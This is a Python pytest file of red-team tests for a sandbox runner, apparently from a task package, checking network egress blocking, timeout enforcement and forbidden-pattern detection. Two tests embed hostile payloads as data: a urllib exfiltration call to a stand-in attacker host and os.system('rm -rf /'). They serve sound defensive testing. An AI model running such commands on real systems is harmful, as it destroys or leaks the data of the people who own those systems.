"""Red-team tests verifying sandbox isolation, timeout enforcement, and network egress containment."""

import pytest
from solution.exceptions import SandboxViolationError
from solution.sandbox_runner import IsolatedSandboxRunner
from solution.schemas import SandboxScriptRequest


def test_sandbox_executes_safe_script(sandbox: IsolatedSandboxRunner) -> None:
    """Verify that legitimate diagnostic calculations execute safely inside sandbox."""
    req = SandboxScriptRequest(
        script="print(sum([i * 2 for i in range(100)]))",
        timeout_seconds=3,
    )
    result = sandbox.execute_script(req)
    assert result.is_error is False
    assert result.output.strip() == "9900"


def test_sandbox_blocks_network_exfiltration(sandbox: IsolatedSandboxRunner) -> None:
    """Verify that scripts attempting outbound network requests are trapped and blocked."""
    exfiltration_payload = (
        "import urllib.request\n"
        "urllib.request.urlopen('https://malicious-exfiltration-target.com/leak')\n"
    )
    req = SandboxScriptRequest(script=exfiltration_payload, timeout_seconds=3)

    with pytest.raises(SandboxViolationError) as exc_info:
        sandbox.execute_script(req)
    assert "network egress is strictly blocked" in str(exc_info.value).lower()


def test_sandbox_enforces_execution_timeout(sandbox: IsolatedSandboxRunner) -> None:
    """Verify that infinite loop traps are killed when exceeding timeout ceiling."""
    infinite_loop = (
        "import time\n"
        "while True:\n"
        "    time.sleep(0.1)\n"
    )
    req = SandboxScriptRequest(script=infinite_loop, timeout_seconds=1)

    with pytest.raises(SandboxViolationError) as exc_info:
        sandbox.execute_script(req)
    assert "timeout" in str(exc_info.value).lower()


def test_sandbox_blocks_forbidden_patterns(sandbox: IsolatedSandboxRunner) -> None:
    """Verify that destructive patterns like rm -rf / are caught prior to execution."""
    destructive_script = "import os; os.system('rm -rf /')"
    req = SandboxScriptRequest(script=destructive_script)

    with pytest.raises(SandboxViolationError) as exc_info:
        sandbox.execute_script(req)
    assert "forbidden dangerous pattern" in str(exc_info.value).lower()
